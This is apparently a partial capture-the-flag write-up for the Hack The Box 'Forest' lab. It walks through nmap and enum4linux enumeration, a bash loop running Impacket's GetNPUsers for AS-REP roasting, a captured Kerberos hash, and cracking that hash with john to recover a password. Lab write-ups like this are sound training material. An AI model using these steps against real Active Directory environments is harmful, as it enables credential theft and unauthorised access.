# Forest HTB

## Nmap

```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49684/tcp open  unknown
49703/tcp open  unknown
49915/tcp open  unknown
```

![image](https://user-images.githubusercontent.com/5285547/124294786-fee12780-db4f-11eb-88e6-68fcfdd18055.png)

![image](https://user-images.githubusercontent.com/5285547/124294837-0e607080-db50-11eb-90a6-eed955859f71.png)

Add to /etc/hosts file

- Enum4linux 
- Users
```
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
user:[noodle] rid:[0x1db2]
```

- ASREPRoast
- Users.txt
```
Administrator
andy
lucinda
mark
santi
sebastien
svc-alfresco
```

- Quick and dirty bash script to use with users.txt 

```
#!/bin/bash

file="$1";

for user in $(cat "$file");do
        python3.9 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -no-pass \
  "htb.local/${user}" -dc-ip 10.10.10.161 ;
done
```

```
bash ASREPRoast.sh users.txt

[*] Getting TGT for Administrator
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for andy
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for lucinda
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for mark
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for santi
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for sebastien
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB.LOCAL:136c3526a51157f1e7b050205902811c$f36282d5015687302ace5572a7265c7775000fdd0c83f4a5965dfdc129d028384fcf106744318f3c8d56f787074df01b336a97764532e9cc60c04b4f8c0c4984b6f2c44145b58eb12f3d80b273d8859ecd0d0b7e84842491990ddd17d90e46489b808798b43b157ea3d41998b5a55ac737a97cf7f1cd27a1ae871d1cde63148d12a0a4c45db0486b86c446f056759e77bf0a7cf5bae2c6bbd5bcbe4a646fdd903af7f751c4d187e98ab8dc0b4c2053c1a07947f2ee827789cec2dada31acf363d75ddaa6dcec80645223234ccdb18dae424c2140062ffc9ddcf7bd64938fd368b2d66fb56827
```

# Cracking the hash 

Adding the hash to a new file then using john to crack the Kerberos password

```
john -w=/usr/share/wordlists/rockyou.txt hash 
```

```
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
1g 0:00:00:03 DONE (2021-07-02 16:37) 0.3289g/s 1344Kp/s 1344Kc/s 1344KC/s s4553592..s3r2s1
```

